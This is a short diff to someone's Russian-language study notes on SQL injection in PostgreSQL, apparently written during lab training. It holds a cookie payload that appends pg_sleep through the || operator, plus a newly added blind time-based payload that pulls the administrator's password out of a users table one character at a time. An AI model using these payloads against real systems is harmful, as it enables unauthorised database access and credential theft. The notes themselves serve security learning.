@@ -1,3 +1,7 @@
 Инъекция в postgresql = Cookie: TrackingId=value'||pg_sleep(10)--;
 Хз зачем ||pg_sleep(10) по сути как альтернатива для OR,AND. По синтаксису перед pg_sleep не должно быть OR,AND. Но gpt говорит, что можно.
 Ну короче профитнее просто юзать ||
+
+
+BLIND time based:
+TrackingId=78KF9QZYPgP0Q64J' || (	SELECT CASE WHEN (SUBSTRING(password,3,1)='w') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--;
